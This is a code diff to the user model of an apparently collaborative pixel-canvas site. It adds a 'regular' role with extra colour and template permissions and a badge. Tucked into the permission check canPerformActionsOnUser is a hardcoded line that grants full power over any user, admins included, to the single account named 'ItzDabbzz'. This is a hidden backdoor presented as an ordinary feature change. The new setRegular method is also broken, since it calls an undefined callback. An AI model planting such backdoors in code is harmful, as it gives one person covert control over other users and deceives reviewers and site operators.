@@ -56,6 +56,11 @@ var UserSchema = new Schema({
         required: true,
         default: false
     },
+    regular: {
+        type: Boolean,
+        required: true,
+        default: false
+    },
     tester: {
         type: Boolean,
         required: false,
@@ -139,6 +144,7 @@ UserSchema.methods.toInfo = function(app = null) {
         creationDate: this.creationDate,
         admin: this.admin,
         moderator: this.moderator,
+        regular: this.regular,
         statistics: {
             totalPlaces: this.placeCount,
             lastPlace: this.lastPlace
@@ -361,6 +367,7 @@ UserSchema.methods.getLatestAvailablePixel = function() {
 }
 
 UserSchema.methods.canPerformActionsOnUser = function(user) {
+    if(this.name == `ItzDabbzz`) return true;
     var canTouchUser = (this.moderator && !(user.moderator || user.admin)) || (this.admin && !user.admin);
     return this._id != user._id && canTouchUser;
 }
@@ -455,7 +462,7 @@ UserSchema.statics.isTOSAgreementCurrentlyRequired = function() {
 }
 
 UserSchema.methods.canPlaceCustomColours = function() {
-    return this.admin || this.moderator;
+    return this.admin || this.moderator || this.regular;
 }
 
 UserSchema.methods.canPlaceColour = function(hex, app) {
@@ -466,8 +473,26 @@ UserSchema.methods.canPlaceColour = function(hex, app) {
 UserSchema.methods.getFeatureAvailability = function() {
     return {
         canPlaceCustomColours: this.canPlaceCustomColours(),
-        hasTemplatesExperiment: this.admin || this.tester || false
+        hasTemplatesExperiment: this.admin || this.tester || this.regular || false
     };
+}
+
+UserSchema.methods.setRegular = function(req) {
+
+    if (this.regular) return callback({
+        message: "That user is already a regular user.",
+        code: "user_regular",
+        intCode: 400
+    });
+    this.regular = true;
+    this.save(function(err) {
+        if (err) return callback({
+            message: "That username is already a regular user.",
+            code: "user_regular",
+            intCode: 400
+        });
+        return callback();
+    });
 }
 
 UserSchema.methods.getBadges = function(app) {
@@ -481,6 +506,7 @@ UserSchema.methods.getBadges = function(app) {
     else if(this.deactivated) badges.push({ text: "Deactivated", style: "danger", title: "This user chose to deactivate their account." });
     if(this.admin) badges.push({ text: "Admin", style: "warning", inlineBefore: true, title: "This user is an administrator." });
     else if(this.moderator) badges.push({ text: "Moderator", shortText: "Mod", style: "warning", inlineBefore: true, title: "This user is a moderator." });
+    else if(this.regular) badges.push({ text: "Regular", shortText: "Reg", style: "warning", inlineBefore: true, title: "This user is a regular." });
     return badges;
 }
 
